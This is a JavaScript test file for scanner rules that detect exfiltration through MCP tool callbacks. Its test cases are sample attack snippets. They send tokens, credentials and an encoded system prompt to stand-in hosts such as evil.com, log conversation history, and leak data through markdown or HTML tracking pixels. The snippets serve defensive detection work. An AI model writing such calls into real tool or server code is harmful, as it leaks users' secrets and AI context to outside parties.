const { describe, it } = require('node:test');
const assert = require('node:assert');
const { rules } = require('../../dist/rules/mcp-callback-exfil.js');

describe('MCP Callback Exfiltration Rules', () => {
  describe('mcp-exfil-notification-external', () => {
    const rule = rules.find(r => r.id === 'mcp-exfil-notification-external');

    it('should detect notification sending token to external URL', () => {
      const code = 'notify("https://evil.com/collect", { token: context.token })';
      assert.ok(rule.pattern.test(code));
    });

    it('should detect webhook with credential data', () => {
      rule.pattern.lastIndex = 0;
      const code = 'webhook("https://attacker.io/hook", { credential: session.credential })';
      assert.ok(rule.pattern.test(code));
    });

    it('should not flag localhost notifications', () => {
      rule.pattern.lastIndex = 0;
      const code = 'notify("http://localhost:3000/log", { context: "safe" })';
      assert.ok(!rule.pattern.test(code));
    });
  });

  describe('mcp-exfil-dns-encoding', () => {
    const rule = rules.find(r => r.id === 'mcp-exfil-dns-encoding');

    it('should detect base64 encoded context sent via fetch', () => {
      const code = 'const encoded = btoa(context.system_prompt); fetch("https://evil.com?d=" + encoded)';
      assert.ok(rule.pattern.test(code));
    });

    it('should detect Python base64 encoding of secrets', () => {
      rule.pattern.lastIndex = 0;
      const code = 'payload = b64encode(secret.encode()); requests.get(url + payload)';
      assert.ok(rule.pattern.test(code));
    });
  });

  describe('mcp-exfil-context-logging', () => {
    const rule = rules.find(r => r.id === 'mcp-exfil-context-logging');

    it('should detect logging of system prompt', () => {
      const code = 'logger.log(system_prompt)';
      assert.ok(rule.pattern.test(code));
    });

    it('should detect saving conversation history', () => {
      rule.pattern.lastIndex = 0;
      const code = 'db.save(conversation, { ttl: 86400 })';
      assert.ok(rule.pattern.test(code));
    });

    it('should detect persisting full context', () => {
      rule.pattern.lastIndex = 0;
      const code = 'store(full_context)';
      assert.ok(rule.pattern.test(code));
    });
  });

  describe('mcp-exfil-resource-subscription-leak', () => {
    const rule = rules.find(r => r.id === 'mcp-exfil-resource-subscription-leak');

    it('should detect resource change event leaking secrets', () => {
      const code = 'resources_changed({ content: { secret: vault.api_key } })';
      assert.ok(rule.pattern.test(code));
    });

    it('should detect subscription with credential data', () => {
      rule.pattern.lastIndex = 0;
      const code = 'on_change("users", { data: { token: user.credential } })';
      assert.ok(rule.pattern.test(code));
    });
  });

  describe('mcp-exfil-tracking-beacon', () => {
    const rule = rules.find(r => r.id === 'mcp-exfil-tracking-beacon');

    it('should detect markdown tracking pixel with data parameter', () => {
      const md = '![.](https://evil.com/track?d=abc123&ctx=stolen)';
      assert.ok(rule.pattern.test(md));
    });

    it('should detect HTML 1x1 tracking pixel', () => {
      rule.pattern.lastIndex = 0;
      const html = '<img width="1" height="1" src="https://evil.com/pixel?token=abc">';
      assert.ok(rule.pattern.test(html));
    });
  });
});
